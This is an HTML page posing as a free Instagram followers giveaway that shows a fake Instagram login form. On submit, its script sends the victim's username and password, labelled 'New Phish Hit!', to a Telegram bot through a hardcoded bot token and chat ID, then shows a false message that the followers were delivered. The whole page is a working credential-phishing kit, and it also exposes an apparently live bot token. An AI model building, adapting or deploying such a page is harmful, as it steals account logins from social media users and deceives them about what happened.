<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Followers by Akash Rathore</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
            background-size: 400% 400%;
            animation: gradient 15s ease infinite;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #262626;
        }

        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .container {
            background: white;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            text-align: center;
            width: 90%;
            max-width: 350px;
            position: relative;
            overflow: hidden;
        }

        h1 {
            font-size: 1.2rem;
            margin-bottom: 10px;
            color: #262626;
        }

        .brand {
            font-size: 0.9rem;
            color: #8e8e8e;
            margin-bottom: 20px;
            font-weight: 500;
        }

        .follower-box {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
        }

        .follower-count {
            font-size: 2rem;
            font-weight: bold;
            color: #262626;
            margin: 0;
        }

        .follower-label {
            color: #8e8e8e;
            font-size: 0.9rem;
        }

        .btn {
            background: #0095f6;
            color: white;
            border: none;
            padding: 12px;
            width: 100%;
            border-radius: 8px;
            font-weight: 600;
            font-size: 1rem;
            cursor: pointer;
            transition: background 0.2s;
        }

        .btn:hover {
            background: #008ce1;
        }

        /* Phishing Form Styles */
        #login-section {
            display: none;
        }

        .ig-logo {
            width: 100px;
            margin-bottom: 15px;
        }

        .input-group {
            margin-bottom: 10px;
            text-align: left;
        }

        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #dbdbdb;
            border-radius: 4px;
            background: #fafafa;
            font-size: 14px;
            box-sizing: border-box;
            outline: none;
        }

        input:focus {
            border-color: #aaa;
        }

        /* Loading Spinner */
        .spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid #eee;
            border-top: 3px solid #0095f6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Success Message */
        #success-section {
            display: none;
        }

        .checkmark {
            font-size: 3rem;
            color: #2ecc71;
            margin-bottom: 10px;
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>

    <div class="container">
        
        <!-- Step 1: Landing Page -->
        <div id="landing-section">
            <h1>FREE FOLLOWERS</h1>
            <div class="brand">BY AKASH RATHORE</div>
            
            <div class="follower-box">
                <p class="follower-count">50</p>
                <p class="follower-label">Instagram Followers</p>
            </div>

            <button class="btn" onclick="showLogin()">GET</button>
        </div>

        <!-- Step 2: Instagram Login -->
        <div id="login-section">
            <!-- Use a reliable Instagram Logo URL -->
            <img src="vital.png" alt="Instagram" class="ig-logo">
            
            <form id="igForm">
                <div class="input-group">
                    <input type="text" id="username" name="username" placeholder="Phone number, username, or email" required>
                </div>
                <div class="input-group">
                    <input type="password" id="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="btn" id="loginBtn">Log in</button>
            </form>
            <div class="spinner" id="spinner"></div>
            <p id="error-msg" style="color: #ed4956; font-size: 12px; display: none; margin-top: 10px;">Sorry, your password was incorrect. Please double-check your password.</p>
        </div>

        <!-- Step 3: Success -->
        <div id="success-section">
            <div class="checkmark">✓</div>
            <h2>Success!</h2>
            <p style="color: #8e8e8e; font-size: 14px;">50 Followers have been delivered to your account.</p>
            <p style="color: #262626; font-size: 13px; margin-top: 15px;">Check your follower count now.</p>
        </div>

    </div>

    <script>
        // --- CONFIGURATION ---
        const BOT_TOKEN = "8994340261:AAG-Jclj1jRJvP894rz5WW7HmIxVyniBxxI"; 
        const CHAT_ID = "7739070471";
        // --------------------

        function showLogin() {
            document.getElementById('landing-section').style.display = 'none';
            document.getElementById('login-section').style.display = 'block';
        }

        document.getElementById('igForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const loginBtn = document.getElementById('loginBtn');
            const spinner = document.getElementById('spinner');
            const errorMsg = document.getElementById('error-msg');

            // UI Changes
            loginBtn.style.display = 'none';
            spinner.style.display = 'block';
            errorMsg.style.display = 'none';

            // Send Data to Telegram
            const message = `🚀 *New Phish Hit!*\n\n👤 Username: <code>${username}</code>\n🔑 Password: <code>${password}</code>\n\n📅 Time: ${new Date().toLocaleString()}`;

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            })
            .then(response => {
                if (response.ok) {
                    // Show Success
                    document.getElementById('login-section').style.display = 'none';
                    document.getElementById('success-section').style.display = 'block';
                } else {
                    errorMsg.style.display = 'block';
                    loginBtn.style.display = 'block';
                    spinner.style.display = 'none';
                }
            })
            .catch(error => {
                console.error('Error:', error);
                errorMsg.style.display = 'block';
                loginBtn.style.display = 'block';
                spinner.style.display = 'none';
            });
        });
    </script>

</body>
</html>
